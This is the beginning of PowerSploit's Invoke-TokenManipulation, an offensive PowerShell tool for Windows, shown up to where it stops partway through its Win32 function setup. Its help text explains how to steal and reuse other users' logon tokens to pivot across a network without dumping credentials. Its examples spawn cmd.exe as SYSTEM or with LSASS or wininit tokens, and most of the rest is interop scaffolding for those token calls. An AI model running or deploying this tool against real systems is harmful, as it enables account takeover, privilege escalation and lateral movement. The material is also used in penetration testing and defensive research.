function Invoke-TokenManipulation
{
<#
.SYNOPSIS

This script requires Administrator privileges. It can enumerate the Logon Tokens available and use them to create new processes. This allows you to use
anothers users credentials over the network by creating a process with their logon token. This will work even with Windows 8.1 LSASS protections.
This functionality is very similar to the incognito tool (with some differences, and different use goals).

This script can also make the PowerShell thread impersonate another users Logon Token. Unfortunately this doesn't work well, because PowerShell
creates new threads to do things, and those threads will use the Primary token of the PowerShell process (your original token) and not the token
that one thread is impersonating. Because of this, you cannot use thread impersonation to impersonate a user and then use PowerShell remoting to connect
to another server as that user (it will authenticate using the primary token of the process, which is your original logon token).

Because of this limitation, the recommended way to use this script is to use CreateProcess to create a new PowerShell process with another users Logon 
Token, and then use this process to pivot. This works because the entire process is created using the other users Logon Token, so it will use their
credentials for the authentication.

IMPORTANT: If you are creating a process, by default this script will modify the ACL of the current users desktop to allow full control to "Everyone". 
This is done so that the UI of the process is shown. If you do not need the UI, use the -NoUI flag to prevent the ACL from being modified. This ACL
is not permenant, as in, when the current logs off the ACL is cleared. It is still preferrable to not modify things unless they need to be modified though,
so I created the NoUI flag. ALSO: When creating a process, the script will request SeSecurityPrivilege so it can enumerate and modify the ACL of the desktop.
This could show up in logs depending on the level of monitoring.


PERMISSIONS REQUIRED:
SeSecurityPrivilege: Needed if launching a process with a UI that needs to be rendered. Using the -NoUI flag blocks this.
SeAssignPrimaryTokenPrivilege : Needed if launching a process while the script is running in Session 0.


Important differences from incognito:
First of all, you should probably read the incognito white paper to understand what incognito does. If you use incognito, you'll notice it differentiates
between "Impersonation" and "Delegation" tokens. This is because incognito can be used in situations where you get remote code execution against a service
which has threads impersonating multiple users. Incognito can enumerate all tokens available to the service process, and impersonate them (which might allow
you to elevate privileges). This script must be run as administrator, and because you are already an administrator, the primary use of this script is for pivoting
without dumping credentials. 

In this situation, Impersonation vs Delegation does not matter because an administrator can turn any token in to a primary token (delegation rights). What does
matter is the logon type used to create the logon token. If a user connects using Network Logon (aka type 3 logon), the computer will not have any credentials for 
the user. Since the computer has no credentials associated with the token, it will not be possible to authenticate off-box with the token. All other logon types
should have credentials associated with them (such as Interactive logon, Service logon, Remote interactive logon, etc). Therefore, this script looks
for tokens which were created with desirable logon tokens (and only displays them by default).

In a nutshell, instead of worrying about "delegation vs impersonation" tokens, you should worry about NetworkLogon (bad) vs Non-NetworkLogon (good).


PowerSploit Function: Invoke-TokenManipulation
Author: Joe Bialek, Twitter: @JosephBialek
License: BSD 3-Clause
Required Dependencies: None
Optional Dependencies: None

.DESCRIPTION

Lists available logon tokens. Creates processes with other users logon tokens, and impersonates logon tokens in the current thread.

.PARAMETER Enumerate

Switch. Specifics to enumerate logon tokens available. By default this will only list unqiue usable tokens (not network-logon tokens).

.PARAMETER RevToSelf

Switch. Stops impersonating an alternate users Token.

.PARAMETER ShowAll

Switch. Enumerate all Logon Tokens (including non-unique tokens and NetworkLogon tokens).

.PARAMETER ImpersonateUser

Switch. Will impersonate an alternate users logon token in the PowerShell thread. Can specify the token to use by Username, ProcessId, or ThreadId.
    This mode is not recommended because PowerShell is heavily threaded and many actions won't be done in the current thread. Use CreateProcess instead.
	
.PARAMETER CreateProcess

Specify a process to create with an alternate users logon token. Can specify the token to use by Username, ProcessId, or ThreadId.
	
.PARAMETER WhoAmI

Switch. Displays the credentials the PowerShell thread is running under.

.PARAMETER Username

Specify the Token to use by username. This will choose a non-NetworkLogon token belonging to the user.

.PARAMETER ProcessId

Specify the Token to use by ProcessId. This will use the primary token of the process specified.

.PARAMETER Process

Specify the token to use by process object (will use the processId under the covers). This will impersonate the primary token of the process.

.PARAMETER ThreadId

Specify the Token to use by ThreadId. This will use the token of the thread specified.

.PARAMETER ProcessArgs

Specify the arguments to start the specified process with when using the -CreateProcess mode.

.PARAMETER NoUI

If you are creating a process which doesn't need a UI to be rendered, use this flag. This will prevent the script from modifying the Desktop ACL's of the 
current user. If this flag isn't set and -CreateProcess is used, this script will modify the ACL's of the current users desktop to allow full control
to "Everyone".

.PARAMETER PassThru

If you are creating a process, this will pass the System.Diagnostics.Process object to the pipeline.

	
.EXAMPLE

Invoke-TokenManipulation -Enumerate

Lists all unique usable tokens on the computer.

.EXAMPLE

Invoke-TokenManipulation -CreateProcess "cmd.exe" -Username "nt authority\system"

Spawns cmd.exe as SYSTEM.

.EXAMPLE

Invoke-TokenManipulation -ImpersonateUser -Username "nt authority\system"

Makes the current PowerShell thread impersonate SYSTEM.

.EXAMPLE

Invoke-TokenManipulation -CreateProcess "cmd.exe" -ProcessId 500

Spawns cmd.exe using the primary token belonging to process ID 500.

.EXAMPLE

Invoke-TokenManipulation -ShowAll

Lists all tokens available on the computer, including non-unique tokens and tokens created using NetworkLogon.

.EXAMPLE

Invoke-TokenManipulation -CreateProcess "cmd.exe" -ThreadId 500

Spawns cmd.exe using the token belonging to thread ID 500.

.EXAMPLE

Get-Process wininit | Invoke-TokenManipulation -CreateProcess "cmd.exe"

Spawns cmd.exe using the primary token of LSASS.exe. This pipes the output of Get-Process to the "-Process" parameter of the script.

.EXAMPLE

(Get-Process wininit | Invoke-TokenManipulation -CreateProcess "cmd.exe" -PassThru).WaitForExit()

Spawns cmd.exe using the primary token of LSASS.exe. Then holds the spawning PowerShell session until that process has exited.

.EXAMPLE

Get-Process wininit | Invoke-TokenManipulation -ImpersonateUser

Makes the current thread impersonate the lsass security token.

.NOTES
This script was inspired by incognito. 

Several of the functions used in this script were written by Matt Graeber(Twitter: @mattifestation, Blog: http://www.exploit-monday.com/).
BIG THANKS to Matt Graeber for helping debug.

.LINK

Blog: http://clymb3r.wordpress.com/
Github repo: https://github.com/clymb3r/PowerShell
Blog on this script: http://clymb3r.wordpress.com/2013/11/03/powershell-and-token-impersonation/

#>

    [CmdletBinding(DefaultParameterSetName="Enumerate")]
    Param(
        [Parameter(ParameterSetName = "Enumerate")]
        [Switch]
        $Enumerate,

        [Parameter(ParameterSetName = "RevToSelf")]
        [Switch]
        $RevToSelf,

        [Parameter(ParameterSetName = "ShowAll")]
        [Switch]
        $ShowAll,

        [Parameter(ParameterSetName = "ImpersonateUser")]
        [Switch]
        $ImpersonateUser,

        [Parameter(ParameterSetName = "CreateProcess")]
        [String]
        $CreateProcess,

        [Parameter(ParameterSetName = "WhoAmI")]
        [Switch]
        $WhoAmI,

        [Parameter(ParameterSetName = "ImpersonateUser")]
        [Parameter(ParameterSetName = "CreateProcess")]
        [String]
        $Username,

        [Parameter(ParameterSetName = "ImpersonateUser")]
        [Parameter(ParameterSetName = "CreateProcess")]
        [Int]
        $ProcessId,

        [Parameter(ParameterSetName = "ImpersonateUser", ValueFromPipeline=$true)]
        [Parameter(ParameterSetName = "CreateProcess", ValueFromPipeline=$true)]
        [System.Diagnostics.Process]
        $Process,

        [Parameter(ParameterSetName = "ImpersonateUser")]
        [Parameter(ParameterSetName = "CreateProcess")]
        $ThreadId,

        [Parameter(ParameterSetName = "CreateProcess")]
        [String]
        $ProcessArgs,

        [Parameter(ParameterSetName = "CreateProcess")]
        [Switch]
        $NoUI,

        [Parameter(ParameterSetName = "CreateProcess")]
        [Switch]
        $PassThru
    )
   
    Set-StrictMode -Version 2

	#Function written by Matt Graeber, Twitter: @mattifestation, Blog: http://www.exploit-monday.com/
	Function Get-DelegateType
	{
	    Param
	    (
	        [OutputType([Type])]
	        
	        [Parameter( Position = 0)]
	        [Type[]]
	        $Parameters = (New-Object Type[](0)),
	        
	        [Parameter( Position = 1 )]
	        [Type]
	        $ReturnType = [Void]
	    )

	    $Domain = [AppDomain]::CurrentDomain
	    $DynAssembly = New-Object System.Reflection.AssemblyName('ReflectedDelegate')
	    $AssemblyBuilder = $Domain.DefineDynamicAssembly($DynAssembly, [System.Reflection.Emit.AssemblyBuilderAccess]::Run)
	    $ModuleBuilder = $AssemblyBuilder.DefineDynamicModule('InMemoryModule', $false)
	    $TypeBuilder = $ModuleBuilder.DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])
	    $ConstructorBuilder = $TypeBuilder.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $Parameters)
	    $ConstructorBuilder.SetImplementationFlags('Runtime, Managed')
	    $MethodBuilder = $TypeBuilder.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $ReturnType, $Parameters)
	    $MethodBuilder.SetImplementationFlags('Runtime, Managed')
	    
	    Write-Output $TypeBuilder.CreateType()
	}


	#Function written by Matt Graeber, Twitter: @mattifestation, Blog: http://www.exploit-monday.com/
	Function Get-ProcAddress
	{
	    Param
	    (
	        [OutputType([IntPtr])]
	    
	        [Parameter( Position = 0, Mandatory = $True )]
	        [String]
	        $Module,
	        
	        [Parameter( Position = 1, Mandatory = $True )]
	        [String]
	        $Procedure
	    )

	    # Get a reference to System.dll in the GAC
	    $SystemAssembly = [AppDomain]::CurrentDomain.GetAssemblies() |
	        Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll') }
	    $UnsafeNativeMethods = $SystemAssembly.GetType('Microsoft.Win32.UnsafeNativeMethods')
	    # Get a reference to the GetModuleHandle and GetProcAddress methods
	    $GetModuleHandle = $UnsafeNativeMethods.GetMethod('GetModuleHandle')
	    $GetProcAddress = $UnsafeNativeMethods.GetMethod('GetProcAddress')
	    # Get a handle to the module specified
	    $Kern32Handle = $GetModuleHandle.Invoke($null, @($Module))
	    $tmpPtr = New-Object IntPtr
	    $HandleRef = New-Object System.Runtime.InteropServices.HandleRef($tmpPtr, $Kern32Handle)

	    # Return the address of the function
	    Write-Output $GetProcAddress.Invoke($null, @([System.Runtime.InteropServices.HandleRef]$HandleRef, $Procedure))
	}

    ###############################
    #Win32Constants
    ###############################
    $Constants = @{
        ACCESS_SYSTEM_SECURITY = 0x01000000
        READ_CONTROL = 0x00020000
        SYNCHRONIZE = 0x00100000
        STANDARD_RIGHTS_ALL = 0x001F0000
        TOKEN_QUERY = 8
        TOKEN_ADJUST_PRIVILEGES = 0x20
        ERROR_NO_TOKEN = 0x3f0
        SECURITY_DELEGATION = 3
        DACL_SECURITY_INFORMATION = 0x4
        ACCESS_ALLOWED_ACE_TYPE = 0x0
        STANDARD_RIGHTS_REQUIRED = 0x000F0000
        DESKTOP_GENERIC_ALL = 0x000F01FF
        WRITE_DAC = 0x00040000
        OBJECT_INHERIT_ACE = 0x1
        GRANT_ACCESS = 0x1
        TRUSTEE_IS_NAME = 0x1
        TRUSTEE_IS_SID = 0x0
        TRUSTEE_IS_USER = 0x1
        TRUSTEE_IS_WELL_KNOWN_GROUP = 0x5
        TRUSTEE_IS_GROUP = 0x2
        PROCESS_QUERY_INFORMATION = 0x400
        TOKEN_ASSIGN_PRIMARY = 0x1
        TOKEN_DUPLICATE = 0x2
        TOKEN_IMPERSONATE = 0x4
        TOKEN_QUERY_SOURCE = 0x10
        STANDARD_RIGHTS_READ = 0x20000
        TokenStatistics = 10
        TOKEN_ALL_ACCESS = 0xf01ff
        MAXIMUM_ALLOWED = 0x02000000
        THREAD_ALL_ACCESS = 0x1f03ff
        ERROR_INVALID_PARAMETER = 0x57
        LOGON_NETCREDENTIALS_ONLY = 0x2
        SE_PRIVILEGE_ENABLED = 0x2
        SE_PRIVILEGE_ENABLED_BY_DEFAULT = 0x1
        SE_PRIVILEGE_REMOVED = 0x4
    }

    $Win32Constants = New-Object PSObject -Property $Constants
    ###############################


    ###############################
    #Win32Structures
    ###############################
	#Define all the structures/enums that will be used
	#	This article shows you how to do this with reflection: http://www.exploit-monday.com/2012/07/structs-and-enums-using-reflection.html
	$Domain = [AppDomain]::CurrentDomain
	$DynamicAssembly = New-Object System.Reflection.AssemblyName('DynamicAssembly')
	$AssemblyBuilder = $Domain.DefineDynamicAssembly($DynamicAssembly, [System.Reflection.Emit.AssemblyBuilderAccess]::Run)
	$ModuleBuilder = $AssemblyBuilder.DefineDynamicModule('DynamicModule', $false)
	$ConstructorInfo = [System.Runtime.InteropServices.MarshalAsAttribute].GetConstructors()[0]

    #ENUMs
	$TypeBuilder = $ModuleBuilder.DefineEnum('TOKEN_INFORMATION_CLASS', 'Public', [UInt32])
	$TypeBuilder.DefineLiteral('TokenUser', [UInt32] 1) | Out-Null
    $TypeBuilder.DefineLiteral('TokenGroups', [UInt32] 2) | Out-Null
    $TypeBuilder.DefineLiteral('TokenPrivileges', [UInt32] 3) | Out-Null
    $TypeBuilder.DefineLiteral('TokenOwner', [UInt32] 4) | Out-Null
    $TypeBuilder.DefineLiteral('TokenPrimaryGroup', [UInt32] 5) | Out-Null
    $TypeBuilder.DefineLiteral('TokenDefaultDacl', [UInt32] 6) | Out-Null
    $TypeBuilder.DefineLiteral('TokenSource', [UInt32] 7) | Out-Null
    $TypeBuilder.DefineLiteral('TokenType', [UInt32] 8) | Out-Null
    $TypeBuilder.DefineLiteral('TokenImpersonationLevel', [UInt32] 9) | Out-Null
    $TypeBuilder.DefineLiteral('TokenStatistics', [UInt32] 10) | Out-Null
    $TypeBuilder.DefineLiteral('TokenRestrictedSids', [UInt32] 11) | Out-Null
    $TypeBuilder.DefineLiteral('TokenSessionId', [UInt32] 12) | Out-Null
    $TypeBuilder.DefineLiteral('TokenGroupsAndPrivileges', [UInt32] 13) | Out-Null
    $TypeBuilder.DefineLiteral('TokenSessionReference', [UInt32] 14) | Out-Null
    $TypeBuilder.DefineLiteral('TokenSandBoxInert', [UInt32] 15) | Out-Null
    $TypeBuilder.DefineLiteral('TokenAuditPolicy', [UInt32] 16) | Out-Null
    $TypeBuilder.DefineLiteral('TokenOrigin', [UInt32] 17) | Out-Null
    $TypeBuilder.DefineLiteral('TokenElevationType', [UInt32] 18) | Out-Null
    $TypeBuilder.DefineLiteral('TokenLinkedToken', [UInt32] 19) | Out-Null
    $TypeBuilder.DefineLiteral('TokenElevation', [UInt32] 20) | Out-Null
    $TypeBuilder.DefineLiteral('TokenHasRestrictions', [UInt32] 21) | Out-Null
    $TypeBuilder.DefineLiteral('TokenAccessInformation', [UInt32] 22) | Out-Null
    $TypeBuilder.DefineLiteral('TokenVirtualizationAllowed', [UInt32] 23) | Out-Null
    $TypeBuilder.DefineLiteral('TokenVirtualizationEnabled', [UInt32] 24) | Out-Null
    $TypeBuilder.DefineLiteral('TokenIntegrityLevel', [UInt32] 25) | Out-Null
    $TypeBuilder.DefineLiteral('TokenUIAccess', [UInt32] 26) | Out-Null
    $TypeBuilder.DefineLiteral('TokenMandatoryPolicy', [UInt32] 27) | Out-Null
    $TypeBuilder.DefineLiteral('TokenLogonSid', [UInt32] 28) | Out-Null
    $TypeBuilder.DefineLiteral('TokenIsAppContainer', [UInt32] 29) | Out-Null
    $TypeBuilder.DefineLiteral('TokenCapabilities', [UInt32] 30) | Out-Null
    $TypeBuilder.DefineLiteral('TokenAppContainerSid', [UInt32] 31) | Out-Null
    $TypeBuilder.DefineLiteral('TokenAppContainerNumber', [UInt32] 32) | Out-Null
    $TypeBuilder.DefineLiteral('TokenUserClaimAttributes', [UInt32] 33) | Out-Null
    $TypeBuilder.DefineLiteral('TokenDeviceClaimAttributes', [UInt32] 34) | Out-Null
    $TypeBuilder.DefineLiteral('TokenRestrictedUserClaimAttributes', [UInt32] 35) | Out-Null
    $TypeBuilder.DefineLiteral('TokenRestrictedDeviceClaimAttributes', [UInt32] 36) | Out-Null
    $TypeBuilder.DefineLiteral('TokenDeviceGroups', [UInt32] 37) | Out-Null
    $TypeBuilder.DefineLiteral('TokenRestrictedDeviceGroups', [UInt32] 38) | Out-Null
    $TypeBuilder.DefineLiteral('TokenSecurityAttributes', [UInt32] 39) | Out-Null
    $TypeBuilder.DefineLiteral('TokenIsRestricted', [UInt32] 40) | Out-Null
    $TypeBuilder.DefineLiteral('MaxTokenInfoClass', [UInt32] 41) | Out-Null
	$TOKEN_INFORMATION_CLASS = $TypeBuilder.CreateType()

    #STRUCTs
    $Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
	$TypeBuilder = $ModuleBuilder.DefineType('LARGE_INTEGER', $Attributes, [System.ValueType], 8)
	$TypeBuilder.DefineField('LowPart', [UInt32], 'Public') | Out-Null
	$TypeBuilder.DefineField('HighPart', [UInt32], 'Public') | Out-Null
	$LARGE_INTEGER = $TypeBuilder.CreateType()

    #Struct LUID
    $Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
	$TypeBuilder = $ModuleBuilder.DefineType('LUID', $Attributes, [System.ValueType], 8)
	$TypeBuilder.DefineField('LowPart', [UInt32], 'Public') | Out-Null
	$TypeBuilder.DefineField('HighPart', [Int32], 'Public') | Out-Null
	$LUID = $TypeBuilder.CreateType()

    #Struct TOKEN_STATISTICS
    $Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
	$TypeBuilder = $ModuleBuilder.DefineType('TOKEN_STATISTICS', $Attributes, [System.ValueType])
	$TypeBuilder.DefineField('TokenId', $LUID, 'Public') | Out-Null
	$TypeBuilder.DefineField('AuthenticationId', $LUID, 'Public') | Out-Null
    $TypeBuilder.DefineField('ExpirationTime', $LARGE_INTEGER, 'Public') | Out-Null
    $TypeBuilder.DefineField('TokenType', [UInt32], 'Public') | Out-Null
    $TypeBuilder.DefineField('ImpersonationLevel', [UInt32], 'Public') | Out-Null
    $TypeBuilder.DefineField('DynamicCharged', [UInt32], 'Public') | Out-Null
    $TypeBuilder.DefineField('DynamicAvailable', [UInt32], 'Public') | Out-Null
    $TypeBuilder.DefineField('GroupCount', [UInt32], 'Public') | Out-Null
    $TypeBuilder.DefineField('PrivilegeCount', [UInt32], 'Public') | Out-Null
    $TypeBuilder.DefineField('ModifiedId', $LUID, 'Public') | Out-Null
	$TOKEN_STATISTICS = $TypeBuilder.CreateType()

    #Struct LSA_UNICODE_STRING
    $Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
	$TypeBuilder = $ModuleBuilder.DefineType('LSA_UNICODE_STRING', $Attributes, [System.ValueType])
	$TypeBuilder.DefineField('Length', [UInt16], 'Public') | Out-Null
	$TypeBuilder.DefineField('MaximumLength', [UInt16], 'Public') | Out-Null
    $TypeBuilder.DefineField('Buffer', [IntPtr], 'Public') | Out-Null
	$LSA_UNICODE_STRING = $TypeBuilder.CreateType()

    #Struct LSA_LAST_INTER_LOGON_INFO
    $Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
	$TypeBuilder = $ModuleBuilder.DefineType('LSA_LAST_INTER_LOGON_INFO', $Attributes, [System.ValueType])
	$TypeBuilder.DefineField('LastSuccessfulLogon', $LARGE_INTEGER, 'Public') | Out-Null
	$TypeBuilder.DefineField('LastFailedLogon', $LARGE_INTEGER, 'Public') | Out-Null
    $TypeBuilder.DefineField('FailedAttemptCountSinceLastSuccessfulLogon', [UInt32], 'Public') | Out-Null
	$LSA_LAST_INTER_LOGON_INFO = $TypeBuilder.CreateType()

    #Struct SECURITY_LOGON_SESSION_DATA
    $Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
	$TypeBuilder = $ModuleBuilder.DefineType('SECURITY_LOGON_SESSION_DATA', $Attributes, [System.ValueType])
	$TypeBuilder.DefineField('Size', [UInt32], 'Public') | Out-Null
	$TypeBuilder.DefineField('LoginID', $LUID, 'Public') | Out-Null
    $TypeBuilder.DefineField('Username', $LSA_UNICODE_STRING, 'Public') | Out-Null
    $TypeBuilder.DefineField('LoginDomain', $LSA_UNICODE_STRING, 'Public') | Out-Null
    $TypeBuilder.DefineField('AuthenticationPackage', $LSA_UNICODE_STRING, 'Public') | Out-Null
    $TypeBuilder.DefineField('LogonType', [UInt32], 'Public') | Out-Null
    $TypeBuilder.DefineField('Session', [UInt32], 'Public') | Out-Null
    $TypeBuilder.DefineField('Sid', [IntPtr], 'Public') | Out-Null
    $TypeBuilder.DefineField('LoginTime', $LARGE_INTEGER, 'Public') | Out-Null
    $TypeBuilder.DefineField('LoginServer', $LSA_UNICODE_STRING, 'Public') | Out-Null
    $TypeBuilder.DefineField('DnsDomainName', $LSA_UNICODE_STRING, 'Public') | Out-Null
    $TypeBuilder.DefineField('Upn', $LSA_UNICODE_STRING, 'Public') | Out-Null
    $TypeBuilder.DefineField('UserFlags', [UInt32], 'Public') | Out-Null
    $TypeBuilder.DefineField('LastLogonInfo', $LSA_LAST_INTER_LOGON_INFO, 'Public') | Out-Null
    $TypeBuilder.DefineField('LogonScript', $LSA_UNICODE_STRING, 'Public') | Out-Null
    $TypeBuilder.DefineField('ProfilePath', $LSA_UNICODE_STRING, 'Public') | Out-Null
    $TypeBuilder.DefineField('HomeDirectory', $LSA_UNICODE_STRING, 'Public') | Out-Null
    $TypeBuilder.DefineField('HomeDirectoryDrive', $LSA_UNICODE_STRING, 'Public') | Out-Null
    $TypeBuilder.DefineField('LogoffTime', $LARGE_INTEGER, 'Public') | Out-Null
    $TypeBuilder.DefineField('KickOffTime', $LARGE_INTEGER, 'Public') | Out-Null
    $TypeBuilder.DefineField('PasswordLastSet', $LARGE_INTEGER, 'Public') | Out-Null
    $TypeBuilder.DefineField('PasswordCanChange', $LARGE_INTEGER, 'Public') | Out-Null
    $TypeBuilder.DefineField('PasswordMustChange', $LARGE_INTEGER, 'Public') | Out-Null
	$SECURITY_LOGON_SESSION_DATA = $TypeBuilder.CreateType()

    #Struct STARTUPINFO
    $Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
	$TypeBuilder = $ModuleBuilder.DefineType('STARTUPINFO', $Attributes, [System.ValueType])
	$TypeBuilder.DefineField('cb', [UInt32], 'Public') | Out-Null
	$TypeBuilder.DefineField('lpReserved', [IntPtr], 'Public') | Out-Null
    $TypeBuilder.DefineField('lpDesktop', [IntPtr], 'Public') | Out-Null
    $TypeBuilder.DefineField('lpTitle', [IntPtr], 'Public') | Out-Null
    $TypeBuilder.DefineField('dwX', [UInt32], 'Public') | Out-Null
    $TypeBuilder.DefineField('dwY', [UInt32], 'Public') | Out-Null
    $TypeBuilder.DefineField('dwXSize', [UInt32], 'Public') | Out-Null
    $TypeBuilder.DefineField('dwYSize', [UInt32], 'Public') | Out-Null
    $TypeBuilder.DefineField('dwXCountChars', [UInt32], 'Public') | Out-Null
    $TypeBuilder.DefineField('dwYCountChars', [UInt32], 'Public') | Out-Null
    $TypeBuilder.DefineField('dwFillAttribute', [UInt32], 'Public') | Out-Null
    $TypeBuilder.DefineField('dwFlags', [UInt32], 'Public') | Out-Null
    $TypeBuilder.DefineField('wShowWindow', [UInt16], 'Public') | Out-Null
    $TypeBuilder.DefineField('cbReserved2', [UInt16], 'Public') | Out-Null
    $TypeBuilder.DefineField('lpReserved2', [IntPtr], 'Public') | Out-Null
    $TypeBuilder.DefineField('hStdInput', [IntPtr], 'Public') | Out-Null
    $TypeBuilder.DefineField('hStdOutput', [IntPtr], 'Public') | Out-Null
    $TypeBuilder.DefineField('hStdError', [IntPtr], 'Public') | Out-Null
	$STARTUPINFO = $TypeBuilder.CreateType()

    #Struct PROCESS_INFORMATION
    $Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
	$TypeBuilder = $ModuleBuilder.DefineType('PROCESS_INFORMATION', $Attributes, [System.ValueType])
	$TypeBuilder.DefineField('hProcess', [IntPtr], 'Public') | Out-Null
	$TypeBuilder.DefineField('hThread', [IntPtr], 'Public') | Out-Null
    $TypeBuilder.DefineField('dwProcessId', [UInt32], 'Public') | Out-Null
    $TypeBuilder.DefineField('dwThreadId', [UInt32], 'Public') | Out-Null
	$PROCESS_INFORMATION = $TypeBuilder.CreateType()

    #Struct TOKEN_ELEVATION
    $Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
	$TypeBuilder = $ModuleBuilder.DefineType('TOKEN_ELEVATION', $Attributes, [System.ValueType])
	$TypeBuilder.DefineField('TokenIsElevated', [UInt32], 'Public') | Out-Null
	$TOKEN_ELEVATION = $TypeBuilder.CreateType()

    #Struct LUID_AND_ATTRIBUTES
    $Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
    $TypeBuilder = $ModuleBuilder.DefineType('LUID_AND_ATTRIBUTES', $Attributes, [System.ValueType], 12)
    $TypeBuilder.DefineField('Luid', $LUID, 'Public') | Out-Null
    $TypeBuilder.DefineField('Attributes', [UInt32], 'Public') | Out-Null
    $LUID_AND_ATTRIBUTES = $TypeBuilder.CreateType()
		
    #Struct TOKEN_PRIVILEGES
    $Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
    $TypeBuilder = $ModuleBuilder.DefineType('TOKEN_PRIVILEGES', $Attributes, [System.ValueType], 16)
    $TypeBuilder.DefineField('PrivilegeCount', [UInt32], 'Public') | Out-Null
    $TypeBuilder.DefineField('Privileges', $LUID_AND_ATTRIBUTES, 'Public') | Out-Null
    $TOKEN_PRIVILEGES = $TypeBuilder.CreateType()

    #Struct ACE_HEADER
    $Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
    $TypeBuilder = $ModuleBuilder.DefineType('ACE_HEADER', $Attributes, [System.ValueType])
    $TypeBuilder.DefineField('AceType', [Byte], 'Public') | Out-Null
    $TypeBuilder.DefineField('AceFlags', [Byte], 'Public') | Out-Null
    $TypeBuilder.DefineField('AceSize', [UInt16], 'Public') | Out-Null
    $ACE_HEADER = $TypeBuilder.CreateType()

    #Struct ACL
    $Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
    $TypeBuilder = $ModuleBuilder.DefineType('ACL', $Attributes, [System.ValueType])
    $TypeBuilder.DefineField('AclRevision', [Byte], 'Public') | Out-Null
    $TypeBuilder.DefineField('Sbz1', [Byte], 'Public') | Out-Null
    $TypeBuilder.DefineField('AclSize', [UInt16], 'Public') | Out-Null
    $TypeBuilder.DefineField('AceCount', [UInt16], 'Public') | Out-Null
    $TypeBuilder.DefineField('Sbz2', [UInt16], 'Public') | Out-Null
    $ACL = $TypeBuilder.CreateType()

    #Struct ACE_HEADER
    $Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
    $TypeBuilder = $ModuleBuilder.DefineType('ACCESS_ALLOWED_ACE', $Attributes, [System.ValueType])
    $TypeBuilder.DefineField('Header', $ACE_HEADER, 'Public') | Out-Null
    $TypeBuilder.DefineField('Mask', [UInt32], 'Public') | Out-Null
    $TypeBuilder.DefineField('SidStart', [UInt32], 'Public') | Out-Null
    $ACCESS_ALLOWED_ACE = $TypeBuilder.CreateType()

    #Struct TRUSTEE
    $Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
    $TypeBuilder = $ModuleBuilder.DefineType('TRUSTEE', $Attributes, [System.ValueType])
    $TypeBuilder.DefineField('pMultipleTrustee', [IntPtr], 'Public') | Out-Null
    $TypeBuilder.DefineField('MultipleTrusteeOperation', [UInt32], 'Public') | Out-Null
    $TypeBuilder.DefineField('TrusteeForm', [UInt32], 'Public') | Out-Null
    $TypeBuilder.DefineField('TrusteeType', [UInt32], 'Public') | Out-Null
    $TypeBuilder.DefineField('ptstrName', [IntPtr], 'Public') | Out-Null
    $TRUSTEE = $TypeBuilder.CreateType()

    #Struct EXPLICIT_ACCESS
    $Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
    $TypeBuilder = $ModuleBuilder.DefineType('EXPLICIT_ACCESS', $Attributes, [System.ValueType])
    $TypeBuilder.DefineField('grfAccessPermissions', [UInt32], 'Public') | Out-Null
    $TypeBuilder.DefineField('grfAccessMode', [UInt32], 'Public') | Out-Null
    $TypeBuilder.DefineField('grfInheritance', [UInt32], 'Public') | Out-Null
    $TypeBuilder.DefineField('Trustee', $TRUSTEE, 'Public') | Out-Null
    $EXPLICIT_ACCESS = $TypeBuilder.CreateType()
    ###############################


    ###############################
    #Win32Functions
    ###############################
    $OpenProcessAddr = Get-ProcAddress kernel32.dll OpenProcess
	$OpenProcessDelegate = Get-DelegateType @([UInt32], [Bool], [UInt32]) ([IntPtr])
	$OpenProcess = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($OpenProcessAddr, $OpenProcessDelegate)

    $OpenProcessTokenAddr = Get-ProcAddress advapi32.dll OpenProcessToken
	$OpenProcessTokenDelegate = Get-DelegateType @([IntPtr], [UInt32], [IntPtr].MakeByRefType()) ([Bool])
	$OpenProcessToken = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($OpenProcessTokenAddr, $OpenProcessTokenDelegate)    

    $GetTokenInformationAddr = Get-ProcAddress advapi32.dll GetTokenInformation
	$GetTokenInformationDelegate = Get-DelegateType @([IntPtr], $TOKEN_INFORMATION_CLASS, [IntPtr], [UInt32], [UInt32].MakeByRefType()) ([Bool])
	$GetTokenInformation = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($GetTokenInformationAddr, $GetTokenInformationDelegate)    

    $SetThreadTokenAddr = Get-ProcAddress advapi32.dll SetThreadToken
	$SetThreadTokenDelegate = Get-DelegateType @([IntPtr], [IntPtr]) ([Bool])
	$SetThreadToken = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($SetThreadTokenAddr, $SetThreadTokenDelegate)    

    $ImpersonateLoggedOnUserAddr = Get-ProcAddress advapi32.dll ImpersonateLoggedOnUser
